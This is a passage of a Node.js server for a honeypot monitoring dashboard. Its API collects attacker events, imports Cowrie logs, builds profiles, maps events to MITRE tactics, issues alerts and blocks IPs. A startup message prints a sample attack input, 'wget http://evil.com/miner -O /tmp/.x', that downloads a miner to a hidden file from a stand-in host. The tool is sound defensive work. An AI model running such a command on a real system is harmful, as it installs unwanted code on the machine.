    res.write("retry:3000\n\n");sseClients.add(res);req.on("close",()=>sseClients.delete(res));return;
  }

  if(method==="GET"&&p==="/api/summary")    return sendJson(res,200,buildSummary(events));
  if(method==="GET"&&p==="/api/events")     return sendJson(res,200,events.sort((a,b)=>new Date(b.timestamp)-new Date(a.timestamp)).slice(0,Number(url.searchParams.get("limit")||100)));
  if(method==="GET"&&p==="/api/attackers")  return sendJson(res,200,buildProfiles(events));
  if(method==="GET"&&p==="/api/iocs")       return sendJson(res,200,extractIOCs(events));
  if(method==="GET"&&p==="/api/tactics")    return sendJson(res,200,buildTacticMatrix(events));
  if(method==="GET"&&p==="/api/geo")        return sendJson(res,200,buildGeoData(events));
  if(method==="GET"&&p==="/api/blocked")    return sendJson(res,200,readBlocked());
  if(method==="GET"&&p==="/api/killchain")  return sendJson(res,200,buildKillChain(events));
  if(method==="GET"&&p==="/api/livefeed")   return sendJson(res,200,buildLiveFeed(events,Number(url.searchParams.get("limit")||40)));
  if(method==="GET"&&p==="/api/alerts")     return sendJson(res,200,generateAlerts(buildProfiles(events)));

  if(method==="GET"&&p==="/api/report"){res.writeHead(200,{"Content-Type":"text/markdown;charset=utf-8"});return res.end(generateMarkdown(events));}
  if(method==="GET"&&p==="/api/export/csv"){res.writeHead(200,{"Content-Type":"text/csv;charset=utf-8","Content-Disposition":`attachment;filename="honeypot-${Date.now()}.csv"`});return res.end(generateCSV(events));}

  if(method==="GET"&&p.startsWith("/api/attackers/")){
    const ip=decodeURIComponent(p.replace("/api/attackers/","").replace("/analysis","").replace("/session",""));
    const profile=buildProfiles(events).find(x=>x.sourceIp===ip);
    if(!profile)return sendJson(res,404,{error:"Not found"});
    if(p.endsWith("/analysis"))return sendJson(res,200,generateAIAnalysis(profile));
    if(p.endsWith("/session")) return sendJson(res,200,buildSession(events,ip));
    return sendJson(res,200,{...profile,events:events.filter(ev=>ev.sourceIp===ip)});
  }

  if(method==="POST"&&p==="/api/events"){
    const body=await readBody(req);const incoming=(Array.isArray(JSON.parse(body||"[]"))?JSON.parse(body||"[]"):[JSON.parse(body||"{}")]).map(normalizeEvent);
    writeEvents([...events,...incoming]);broadcast("events",{count:incoming.length});return sendJson(res,201,{imported:incoming.length});
  }
  if(method==="POST"&&p==="/api/import/cowrie"){
    const body=await readBody(req);const incoming=parseCowrie(body);
    writeEvents([...events,...incoming]);broadcast("events",{count:incoming.length});return sendJson(res,201,{imported:incoming.length});
  }
  if(method==="POST"&&p==="/api/simulate"){
    const count=Math.max(1,Math.min(50,Number(url.searchParams.get("count")||12)));
    const incoming=simulate(count);
    writeEvents([...readEvents(),...incoming]);broadcast("events",{count});return sendJson(res,201,{imported:incoming.length});
  }
  if(method==="POST"&&p==="/api/reset"){
    if(!fs.existsSync(SEED_FILE))return sendJson(res,500,{error:"Seed file missing"});
    fs.copyFileSync(SEED_FILE,DATA_FILE);
    writeAlerts([]);writeAcknowledged([]);writeBlocked([]);
    broadcast("reset",{});return sendJson(res,200,{message:"Reset to seed data."});
  }
  if(method==="POST"&&p.startsWith("/api/block/")){
    const ip=decodeURIComponent(p.replace("/api/block/",""));
    const profile=buildProfiles(events).find(x=>x.sourceIp===ip);
    const blocked=readBlocked();
    if(!blocked.find(b=>b.ip===ip)){
      blocked.push({ip,country:profile?.country||"Unknown",persona:profile?.aiProfile?.persona||"Unknown",riskScore:profile?.aiProfile?.score||0,blockedAt:new Date().toISOString()});
      writeBlocked(blocked);broadcast("blocked",{ip});
    }
    return sendJson(res,200,{blocked:true,ip});
  }
  if(method==="DELETE"&&p.startsWith("/api/block/")){
    const ip=decodeURIComponent(p.replace("/api/block/",""));
    writeBlocked(readBlocked().filter(b=>b.ip!==ip));return sendJson(res,200,{unblocked:true,ip});
  }
  if(method==="PATCH"&&p.includes("/ack")){
    const id=p.replace("/api/alerts/","").replace("/ack","");
    const acked=readAcknowledged();if(!acked.includes(id)){acked.push(id);writeAcknowledged(acked);}
    return sendJson(res,200,{acknowledged:true,id});
  }

  sendJson(res,404,{error:"Not found"});
}

// ── Server ───────────────────────────────────────────────────────────────────
function createServer(){
  return http.createServer(async(req,res)=>{
    res.setHeader("Access-Control-Allow-Origin","*");
    try{if(req.url.startsWith("/api/"))await handleApi(req,res);else serveStatic(req,res);}
    catch(err){sendJson(res,500,{error:err.message||"Internal error"});}
  });
}

if(require.main===module){
  createServer().listen(PORT,HOST,()=>{
    console.log(`\n🍯  HoneyTrace AI  →  http://${HOST}:${PORT}`);
    console.log(`\n📡  Send a test attack from terminal:\n`);
    console.log(`   curl -X POST http://${HOST}:${PORT}/api/import/cowrie -H "Content-Type: application/json" \\`);
    console.log(`   -d '{"eventid":"cowrie.command.input","src_ip":"1.2.3.4","username":"root","input":"wget http://evil.com/miner -O /tmp/.x"}'`);
    console.log(`\n   node -e "require('./scripts/attack-simulator')"   # full attack sequence\n`);
  });
}

module.exports={MITRE_RULES,buildProfiles,buildSummary,classifyAttacker,createServer,generateMarkdown,generateCSV,mapMitre:mapMitre,normalizeEvent,parseCowrie,simulate,generateAlerts,extractIOCs,buildTacticMatrix};
